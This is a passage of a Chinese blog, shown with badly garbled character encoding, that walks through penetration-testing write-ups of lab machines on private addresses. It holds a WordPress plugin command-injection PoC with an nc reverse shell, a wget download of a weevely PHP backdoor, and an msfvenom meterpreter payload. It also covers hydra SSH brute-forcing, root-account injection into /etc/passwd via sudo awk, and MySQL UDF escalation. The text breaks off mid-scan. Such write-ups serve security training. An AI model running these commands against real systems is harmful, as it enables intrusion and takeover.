æµè§ˆé™æ€æ–‡ä»¶æ—¶å‘ç°å›¾ç‰‡æ–‡ä»¶/img/flaghost.png å›¾ç‰‡æœ¬èº«å¹¶æ²¡æœ‰æœ‰æ•ˆä¿¡æ¯ ä¸‹è½½è‡³æœ¬åœ°ï¼Œç”¨LSBéšå†™æ£€æµ‹ç¨‹åºzstegæ£€æµ‹å›¾ç‰‡ 12zsteg flaghost.png meta Make .. text: &quot;passw@45&quot; å¾—åˆ°å­—ç¬¦ä¸²passw@45 è¿™é‡Œå°è¯•è¿‡ç”¨è¿™ä¸ªå­—ç¬¦ä¸²ä½œä¸ºå¯†ç æ¥ç™»å…¥wordpresså’ŒsshæœåŠ¡ï¼Œä½†éƒ½å¤±è´¥ å°è¯•åå‘ç°è·¯å¾„/passw@45/ è¯¥è·¯å¾„ä¸‹å­˜åœ¨æ–‡æœ¬flag2.txt 12345i+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ +++++ +++++ +++++ .&lt;+++ +[-&gt;- ---&lt;]&gt;--.- --.&lt;+ +++++ [-&gt;-- ----&lt; ]&gt;--- -.&lt;++ +[-&gt;+ ++&lt;]&gt; +++++ .&lt;+++ ++[-&gt;+++++ &lt;]&gt;.+ +.+++ +++++ .---- --.&lt;+ ++[-&gt; +++&lt;] &gt;++++ .&lt;+++ ++++[ -&gt;-------&lt; ]&gt;-.&lt; +++[- &gt;---&lt; ]&gt;--- .+.-- --.++ +.&lt; brainfuckç¼–ç  https://www.splitbrain.org/services/ook åœ¨è¿™ä¸ªé“¾æ¥è§£ç åå¾—åˆ°è´¦æˆ· web:Hacker@4514 è¿™ä¸ªè´¦æˆ·å¯ä»¥ç”¨äºç™»å…¥wordpressæœåŠ¡ï¼Œä¹Ÿå¯ä»¥ç™»å…¥sshæœåŠ¡ è¿™é‡Œèµ˜è¿°ä¸€ä¸‹wordpressçš„æ¸—é€æ€è·¯ ç™»å…¥wordpressä¹‹ååœ¨Pluginsé¢æ¿çœ‹åˆ°Plainview Activity Monitor æœç´¢ç›¸å…³æ¼æ´ 12345678searchsploit Plainview Activity Monitor----------------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;)----------------------------------------------------------------------------------------- ----------------------------------------WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection | exploits&#x2F;php&#x2F;webapps&#x2F;45274.html----------------------------------------------------------------------------------------- ----------------------------------------Shellcodes: No Result é˜…è¯»ç›¸å…³æ–‡æ¡£ 12345678910111213141516171819202122cat &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;45274.htmlPoC:--&gt;&lt;html&gt; &lt;!-- Wordpress Plainview Activity Monitor RCE [+] Version: 20161228 and possibly prior [+] Description: Combine OS Commanding and CSRF to get reverse shell [+] Author: LydA(c)ric LEFEBVRE [+] CVE-ID: CVE-2018-15877 [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well --&gt; &lt;body&gt; &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;&#x2F;&#39;)&lt;&#x2F;script&gt; &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;localhost:8000&#x2F;wp-admin&#x2F;admin.php?page&#x3D;plainview_activity_monitor&amp;tab&#x3D;activity_tools&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt; &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;ip&quot; value&#x3D;&quot;google.fr| nc -nlvp 127.0.0.1 9999 -e &#x2F;bin&#x2F;bash&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;lookup&quot; value&#x3D;&quot;Lookup&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit request&quot; &#x2F;&gt; &lt;&#x2F;form&gt; &lt;&#x2F;body&gt; è¿™é‡Œåˆ™éœ€è¦è®¿é—®/wordpress/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools ä¸ªäººå°è¯•POCæ‰€ç»™å‡ºçš„åå¼¹Shellå‘½ä»¤æ—¶æ— æ•ˆï¼Œé€‰æ‹©å…ˆä¸Šä¼ phpæœ¨é©¬å†ä¸Šä¼ meterpreteråé—¨ç¨‹åºçš„æ–¹æ³• è¿™é‡Œéœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œè¾“å…¥æ¡†çš„ç›¸å…³ä»£ç å¦‚ä¸‹ &lt;input aria-required=&quot;true&quot; class=&quot;text required validates&quot; id=&quot;plainview_sdk_pvam_form2_inputs_text_ip&quot; maxlength=&quot;15&quot; name=&quot;ip&quot; required=&quot;true&quot; size=&quot;15&quot; type=&quot;text&quot; value=&quot;&quot;&gt; maxlengthä¼šé™åˆ¶è¾“å…¥çš„é•¿åº¦ï¼Œsizeä¼šé™åˆ¶æ˜¾ç¤ºå·²è¾“å…¥å­—ç¬¦çš„é•¿åº¦ï¼Œä½¿ç”¨F12é€‚å½“ä¿®æ”¹å³å¯ å°è¯•å‘½ä»¤æ³¨å…¥ a.b|ls å›æ˜¾å¾—åˆ°æ–‡ä»¶åˆ—è¡¨ æœ¬åœ°æ„å»ºphpåé—¨å¹¶å¼€å¯HTTPæœåŠ¡ 12weevely generate pass shell.phppython -m SinpleHTTPServer 9900 æ³¨å…¥ä¸‹è½½å‘½ä»¤ a.b|wget http://192.168.31.10:9900/shell.php è¿æ¥æœ¨é©¬ weevely http://192.168.31.36/wordpress/wp-admin/shell.php æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ 12uname -aLinux jax 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:01:15 UTC 2019 i686 i686 i686 GNU&#x2F;Linux æ„é€ åé—¨ç¨‹åº msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9933 -f elf &gt; msf.elf MSFå¼€å¯ç›‘å¬ 12345use exploit&#x2F;multi&#x2F;handler set payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.31.10set LPORT 9933run ä¸Šä¼ åé—¨å¹¶æ‰§è¡Œ 123file_upload msf.elf &#x2F;tmp&#x2F;msf.elfchmod +x &#x2F;tmp&#x2F;msf.elf.&#x2F;msf.elf &amp; MSFæ¥æ”¶åˆ°shell ä¹‹åå¯èƒ½éœ€è¦é ç©å®¶å¼€è„‘æ´åˆ‡æ¢åˆ°webè´¦æˆ·ï¼ˆæ¯”å¦‚çœ‹åˆ°passwdæ–‡ä»¶é‡Œå­˜åœ¨webè´¦æˆ·è”æƒ³åˆ°å¯†ç å…±ç”¨ï¼‰ æƒé™æå‡ ç™»å…¥SSHæœåŠ¡ 12345678910ssh web@192.168.31.36Hacker@4514sudo -lMatching Defaults entries for web on jax: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin\\:&#x2F;snap&#x2F;binUser web may run the following commands on jax: (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;awk å¯ä»¥ä»¥rootæƒé™æ‰§è¡Œawkå‘½ä»¤ å¯ä»¥ç”¨awkå‘½ä»¤ä¿®æ”¹æ–‡ä»¶/etc/passwd æŸ¥çœ‹æ–‡ä»¶/etc/passwd 123456789101112131415161718192021222324252627282930313233cat &#x2F;etc&#x2F;passwdroot:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bashdaemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologinbin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinsys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologinsync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;syncgames:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologinman:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologinlp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologinmail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologinnews:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologinuucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologinproxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinwww-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologinbackup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologinlist:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologinirc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologingnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologinnobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologinsystemd-timesync:x:100:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;falsesystemd-network:x:101:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;bin&#x2F;falsesystemd-resolve:x:102:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;bin&#x2F;falsesystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;falsesyslog:x:104:108::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;false_apt:x:105:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;falselxd:x:106:65534::&#x2F;var&#x2F;lib&#x2F;lxd&#x2F;:&#x2F;bin&#x2F;falsemessagebus:x:107:111::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;falseuuidd:x:108:112::&#x2F;run&#x2F;uuidd:&#x2F;bin&#x2F;falsednsmasq:x:109:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;bin&#x2F;falsesshd:x:110:65534::&#x2F;var&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologinmysql:x:111:117:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;falseuser-a:x:1000:1000:uname-a,,,:&#x2F;home&#x2F;uname-a:&#x2F;bin&#x2F;bashweb:x:1001:1000::&#x2F;home&#x2F;web:&#x2F;bin&#x2F;sh æ„é€ è´¦æˆ·ä¿¡æ¯ 123openssl passwd -6 hackforfun $6$qlYFR0rRnblVOfau$jH&#x2F;WAe8jTWMJjZ8&#x2F;eO77&#x2F;JCPHwbSwu1f9LAcv54xbyEfGdTrwaSBhpDIqDRDRb.AnP9QVJg1T9fftOrZH1zsQ1echo &#39;echo &#39;test:$6$DwMIt8OMOkuT9TVw$Wf4dJhyXDSlGCvseOFVXDc2qzE53zeN.IAPBKVeuFOKIihknB.kmBwqzQnp.RlibevBoJzcDLzSlkDF7OdTIK0:0:0::&#x2F;:&#x2F;bin&#x2F;bash&#39; &gt; &#x2F;tmp&#x2F;1&#39; opensslå‘½ä»¤éœ€åœ¨æœ¬åœ°è¿è¡Œ å†™å…¥è´¦æˆ·ä¿¡æ¯ sudo -u root awk '/web:\\/bin\\/sh/&#123;system(&quot;cat /tmp/1&quot;)&#125;' /etc/passwd &gt;&gt; /etc/passwd åˆ‡æ¢è‡³root 1234su testhackforfunid uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) localhost ä¿®æ”¹æ–‡ä»¶/etc/hostsï¼Œå°†127.0.0.1 localhostè¿™ä¸€è¡Œå‰é¢åŠ ä¸Šâ€™#â€™ï¼Œå†å†™å…¥IP localhostã€‚è¿™æ ·å°±è§£å†³äº†ç‚¹å‡»é“¾æ¥æ—¶æ€»æ˜¯è·³è½¬localhostçš„é—®é¢˜ã€‚æœ¬åœ°æµ‹è¯•æ—¶ï¼ŒChromeè®¿é—®localhostè¿˜æ˜¯ä¼šæœ‰é—®é¢˜ï¼Œè€ŒFirefoxå¯ä»¥æ­£å¸¸è®¿é—®ã€‚ awk éœ€è¦é€šè¿‡æ­£åˆ™åŒ¹é…åˆ°æ–‡ä»¶æœ€åçš„ä¸€æ®µå­—ç¬¦ä¸²ï¼Œå†å†™å…¥è´¦æˆ·ä¿¡æ¯ï¼Œå¦åˆ™å†™å…¥è¿‡å¤šæ•°æ®ã€‚ å½“ä½ æ”¶é›†åˆ°çš„ä¿¡æ¯è¶Šå°‘çš„æ—¶å€™ï¼Œéœ€è¦ç»§ç»­æŒ–æ˜çš„åœ°æ–¹å°±è¶Šå¤š å‚è€ƒèµ„æ–™ awk.write Deception 2020/03/19 19:06:44 ç«¯å£æ‰«æ nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.207 12345678910111213141516171819202122Nmap scan report for 192.168.31.207Host is up (0.00040s latency).Not shown: 65533 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 9d:d0:98:da:0d:32:3d:0b:3f:42:4d:d7:93:4f:fd:60 (RSA)| 256 4c:f4:2e:24:82:cf:9c:8d:e2:0c:52:4b:2e:a5:12:d9 (ECDSA)|_ 256 a9:fb:e3:f4:ba:d6:1e:72:e7:97:25:82:87:6e:ea:01 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.29 ((Ubuntu))| http-methods: |_ Supported Methods: GET POST OPTIONS HEAD|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksMAC Address: 08:00:27:5B:20:2A (Oracle VirtualBox virtual NIC)Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)No exact OS matches for host (test conditions non-ideal).Uptime guess: 14.153 days (since Wed Mar 4 23:18:19 2020)Network Distance: 1 hopTCP Sequence Prediction: Difficulty&#x3D;263 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel Webè·¯å¾„æšä¸¾ dirb http://192.168.31.207 -w 12345678910---- Scanning URL: http:&#x2F;&#x2F;192.168.31.207&#x2F; ----+ http:&#x2F;&#x2F;192.168.31.207&#x2F;index.html (CODE:200|SIZE:11026) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.207&#x2F;javascript&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.207&#x2F;phpmyadmin&#x2F; + http:&#x2F;&#x2F;192.168.31.207&#x2F;server-status (CODE:403|SIZE:279) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F;---- Entering directory: http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F; ----+ http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F;index.php (CODE:301|SIZE:0) + http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F;robots.txt (CODE:200|SIZE:22) wordpresæ¡†æ¶å†…çš„é“¾æ¥æŒ‡å‘çš„ä¸»æœºä¸ºlocalhostï¼Œéœ€è¦å°†æ–‡ä»¶/etc/hostsä¸­çš„127.0.0.1 localhostè¿™ä¸€è¡Œæ³¨é‡Šï¼Œå†å†™å…¥192.168.31.207 localhostï¼Œä½¿ç”¨firefoxå³å¯æ­£å¸¸è®¿é—® æ¼æ´åˆ©ç”¨ è®¿é—®/wordpress/robots.txt 1allow : &#x2F;robots.html è®¿é—®/wordpress/robots.html åˆ†æjså¾—çŸ¥ç‚¹å‡»&quot;show quest&quot;15æ¬¡ä¹‹åä¼šè·³è½¬è‡³&quot;admindelete.html&quot; è®¿é—®/wordpress/admindelete.html 1LOL,A Noob is looking for a hint è®¿é—®/wordpress/himt.html 1Please collect all the API tokens availabe on the home page åœ¨é¡µé¢/æ”¶é›†åˆ°å››æ®µAPI Token 1234API old0 : 5F4DCC3B5AAAPI old1 : 765D61D8API old2 : 327DEBAPI new : 882CF99 æ•´ç†è¿™äº›API 1234567cat pass 5F4DCC3B5AA765D61D8327DEB882CF995F4DCC3B5AA765D61D8327DEB882CF99 æšä¸¾wordpressæ¡†æ¶çš„ç”¨æˆ·å/æ’ä»¶/ä¸»é¢˜ 1234567891011wpscan --url http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F; -e u ap at[i] User(s) Identified:[+] haclabs | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] yash | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) æœªå‘ç°å…³äºæ’ä»¶ä¸ä¸»é¢˜çš„æœ‰æ•ˆä¿¡æ¯ æ•´ç†å¾—åˆ°ç”¨æˆ·åå­—å…¸ 123cat useryashhaclabs å°†å…¶ç”¨ä½œå£ä»¤å­—å…¸æ¥çˆ†ç ´wordpressç™»å½•æ¡†ï¼Œå¤±è´¥ å°†å…¶ç”¨ä½œå£ä»¤å­—å…¸æ¥çˆ†ç ´sshæœåŠ¡ 123hydea -I -L user -P pass ssh:&#x2F;&#x2F;192.168.31.207[22][ssh] host: 192.168.31.207 login: yash password: 5F4DCC3B5AA765D61D8327DEB882CF99 å¾—åˆ°sshæœåŠ¡çš„è´¦æˆ· æƒé™æå‡ ç™»å…¥sshæœåŠ¡ 12ssh yash@192.168.31.2075F4DCC3B5AA765D61D8327DEB882CF99 åœ¨ç›®å½•/home/yashä¸‹å‘ç°éšè—æ–‡ä»¶.systemlogs 123cat .systemlogs ssdsdsdsdsdqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklqwertyuiop1234567890qazxdswedcfrfgvbhyyhnkiollokmkijnjuyhbhytgvfrdcxdesxzsyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklzaq123456vfr4567890mnbvcde4567890yuiopasdfghjklzxcvbnmzxcvbnmasdfghjklmnbvcxzsaq234567890-098765rewsxcvbnm,lpoiuytresxcbnmkoiuytredcyuiopasdfghjklzxcvbnmzxcvbnmasdfghjk!@#$dfkdfjdkfjdf!@#$fdjferheirdfdfksdjhfsg24356789yuiopasdfghjklzxcvbnmzxcvbnmasdfghjkljdfivnd&quot;haclabs&quot;jsdskdjskdjsldsklfjlkfdgl&#x2F;dsfgkdhfgkdfgdjfhkagdhkdhgkkdzfkgdhfffgkhsfhgkdfhgkjlsfladjsflslfjlaaakjdflkaejflyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklNDmsfmbwebrm43564576nu4r50q824305485103601856035860020^&amp;*()sdjfsdflsdfaldjfleragkrjgkfdghdfhksjdhgsghkskskfskgkshkshksfhkgkrtho43euvnd,m,mnhjkjhgfdrtfghj,;poiuytgbvftyhjkllksjhgdfrteuyue&quot;A&#x3D;123456789&quot;fdsgfhndsffjladjksfjlsdfjlfghfieruyiehgkfnjuyhbvcftyu789876543wsxcvbnm,mju76543asxcferfgbnm,klokjhgbvcxsdfklsdfweri34o58uwotueagsdgjlyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklwlarqlewairp3wi4te0596q03496tiquieljkgrelrsjto5euyjgeldfhqowe5uy4seyjelsdglsoh45yeujhskehgesjhgsyuiopasdfghjklzxcvbnmzxcvbnmasdfghjkldsklflssldfjlsdfjsldfjsldfjld&quot;+A[::-1]&quot;fjlsdnvsldvnsujnhgfqwertyuioplkjhgfdsazxcvbnm,mnbvcxzasdfghjkl;poiuytrewqazxsedcvftghnklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjkldjfkdslfjsldfjsldfjlw4o32894829348293489289389 å¯ä»¥çœ‹åˆ°æœ‰ä¸‰æ®µå†…å®¹ç”¨å¼•å·æ ‡è¯† 123&quot;haclabs&quot;&quot;A&#x3D;123456789&quot;&quot;+A[::-1]&quot; å°è¯•åå¾—å‡ºè´¦æˆ·haclabsçš„å¯†ç  12su haclabshaclabs987654321 åˆ‡æ¢è‡³è´¦æˆ·haclabs æŸ¥çœ‹sudoæƒé™ 123456789sudo -lhaclabs987654321Matching Defaults entries for haclabs on haclabs: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin\\:&#x2F;snap&#x2F;binUser haclabs may run the following commands on haclabs: (ALL : ALL) ALL sudoææƒ 123sudo -iid uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),27(sudo) Mysql UDFææƒ æ‹¿åˆ°yashè´¦æˆ·åææƒé‡åˆ°ç“¶é¢ˆï¼Œä¸Šä¼ äº†è„šæœ¬linuxprivcheckerï¼Œè¿è¡Œè¿‡åæŠ¥å‘Šå¯èƒ½å­˜åœ¨Mysqlçš„UDFææƒçš„å¯èƒ½ æŸ¥é˜…äº†ç›¸å…³èµ„æ–™ä¹‹åå‘ç°å‡ ä¸ªé—®é¢˜ éœ€è¦rootè´¦æˆ· secure_file_priv plugin_dir å¯ä»¥å…ˆåœ¨wordpressçš„é…ç½®æ–‡ä»¶ä¸­è·å–è´¦æˆ· 1234567891011121314151617181920cat &#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress&#x2F;wp-config.php&#x2F;&#x2F; ** MySQL settings - You can get this info from your web host ** &#x2F;&#x2F;&#x2F;** The name of the database for WordPress *&#x2F;define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );&#x2F;** MySQL database username *&#x2F;define( &#39;DB_USER&#39;, &#39;wordpressuser&#39; );&#x2F;** MySQL database password *&#x2F;define( &#39;DB_PASSWORD&#39;, &#39;cry4moon&#39; );&#x2F;** MySQL hostname *&#x2F;define( &#39;DB_HOST&#39;, &#39;localhost&#39; );&#x2F;** Database Charset to use in creating database tables. *&#x2F;define( &#39;DB_CHARSET&#39;, &#39;utf8&#39; );&#x2F;** The Database Collate type. Don&#39;t change this if in doubt. *&#x2F;define( &#39;DB_COLLATE&#39;, &#39;&#39; ); æ‹¿åˆ°è´¦æˆ·ä¹‹åå†ä½¿ç”¨mysqlå®¢æˆ·ç«¯ç™»å…¥æœåŠ¡ mysql -h localhost -u wordpressuser -pcry4moon å†æŸ¥çœ‹rootè´¦æˆ·çš„å¯†ç  123456789101112131415mysql&gt; select host,user,authentication_string from mysql.user;+---------------+------------------+-------------------------------------------+| host | user | authentication_string |+---------------+------------------+-------------------------------------------+| localhost | root | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC || localhost | mysql.session | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE || localhost | mysql.sys | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE || localhost | debian-sys-maint | *2A702E4018EF99C245B5DC4E753531720BDC94E0 || % | haclabs | *1565CEE976A27D283F4ECF1EC2AEE11E71C8D208 || localhost | phpmyadmin | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC || wordpressuser | wordpress | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC || localhost | wordpress | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC || localhost | wordpressuser | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC |+---------------+------------------+-------------------------------------------+9 rows in set (0.20 sec) å¯ä»¥çœ‹åˆ°localhostè´¦æˆ·çš„å¯†ç hashå’Œwordpressuserçš„ä¸€æ ·ï¼Œå³éƒ½æ˜¯cry4moon ä½†æ˜¯æ— æ³•ç™»å…¥ï¼Œæµ‹è¯•æ—¶é‡æ–°è®¾ç½®äº†å¯†ç ï¼Œæ“ä½œå¦‚ä¸‹ 123update mysql.user set authentication_string&#x3D;PASSWORD(&quot;cry4moon&quot;) where user&#x3D;&#39;root&#39;;update mysql.user set plugin&#x3D;&quot;mysql_native_password&quot;;flush privileges; å®Œæˆæ›´æ”¹å¯†ç ä¹‹åå³å¯ä»¥rootè´¦æˆ·ç™»å…¥ è€ŒUDFææƒåˆ™éœ€è¦åœ¨æ’ä»¶ç›®å½•å†™å…¥æ–‡ä»¶ï¼Œå…³äºç›®å½•å¯ä»¥ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥é˜… 1234567mysql&gt; show variables like &#39;plugin_dir&#39;;+---------------+------------------------+| Variable_name | Value |+---------------+------------------------+| plugin_dir | &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F; |+---------------+------------------------+1 row in set (0.07 sec) å³/usr/lib/mysql/plugin/ è€Œåœ¨å†™å…¥æ–‡ä»¶æ—¶ä¼šå‘ç”Ÿé”™è¯¯ï¼ŒåŸå› æ˜¯secure_file_privå‚æ•°å¯¹äºæ–‡ä»¶å†™å…¥å­˜åœ¨é™åˆ¶ 1234567mysql&gt; SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;+------------------+-----------------------+| Variable_name | Value |+------------------+-----------------------+| secure_file_priv | &#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F; |+------------------+-----------------------+1 row in set (0.01 sec) å³åªèƒ½å†™å…¥ç›®å½•/var/lib/mysql-files/ï¼Œå­ç›®å½•ä¸‹ä¹Ÿä¸è¡Œ è‹¥è¯¥å€¼ä¸ºç©ºï¼Œåˆ™æ— é™åˆ¶ è‹¥è¯¥å€¼ä¸ºNULLï¼Œåˆ™ä¸å¯å†™å…¥ ææƒéœ€è¦å°†æ–‡ä»¶ä½œä¸ºæ’ä»¶å†™å…¥plugin_dirï¼Œä½†ä¸å‚æ•°secure_file_privå†²çªï¼Œæ•…å†™å…¥æ—¶ä¼šæŠ¥é”™ã€‚è€Œå‚æ•°secure_file_privä¸ºåªè¯»å‚æ•°ï¼Œä¸èƒ½å†mysqlå®¢æˆ·ç«¯ä¸­æ›´æ”¹ï¼Œåªèƒ½ä¿®æ”¹mysqld.cnfï¼Œå†™å…¥&quot;secure_file_priv=&quot;ï¼Œå¹¶ä¸”é‡å¯mysqlæœåŠ¡ï¼Œæ‰èƒ½ç»§ç»­è¿›è¡ŒUDFææƒã€‚ ä¹‹åå‘ç”Ÿç„å­¦è¿ç»´ï¼Œæ‰‹åŠ¨ä¿®æ”¹äº†secure_file_privå‚æ•°ï¼Œæƒé™777çš„è·¯å¾„å†™å…¥æ–‡ä»¶ä¼šæŠ¥é”™æƒé™å¦è®¤ï¼Œæ‰‹åŠ¨ç§»åŠ¨çš„soæ–‡ä»¶å¯ä»¥è½½å…¥ä½†æ˜¯ä¸èƒ½æ‰§è¡Œå‘½ä»¤ã€‚ 123456use mysql;create table foo(line blob);insert into foo values(load_file(&#39;&#x2F;tmp&#x2F;udf.so&#39;));select * from foo into dumpfile &#39;%plugin_dir%&#x2F;udf.so&#39;;create function sys_eval returns string soname &#39;udf2.so&#39;;select sys_eval(&#39;id&#39;); linuxä¸‹çš„soæ–‡ä»¶ä¸windowsä¸‹çš„dllæ–‡ä»¶åœ¨MSFä¸­éƒ½æœ‰é™„å¸¦ å‚è€ƒèµ„æ–™ WP UDF UDF Mysql.pass no_name 2020/03/27 01:05:37 ç«¯å£æ‰«æ nmap -p 1-65535 -T5 -sV -A -n -v 192.168.31.196 12345678910111213141516171819202122Nmap scan report for 192.168.31.196Host is up (0.00048s latency).Not shown: 65533 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 78:2b:f7:57:bf:da:fd:ec:e0:d5:60:c4:8b:53:62:fd (RSA)| 256 36:82:4a:8b:71:f7:78:da:49:42:f9:88:6d:26:73:6a (ECDSA)|_ 256 dc:18:8e:b3:36:53:cb:10:34:98:57:3d:f0:a1:2b:ad (ED25519)80&#x2F;tcp open http Apache httpd 2.4.29 ((Ubuntu))| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)|_http-title: Site doesn&#39;t have a title (text&#x2F;html; charset&#x3D;UTF-8).MAC Address: 08:00:27:59:63:EF (Oracle VirtualBox virtual NIC)Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 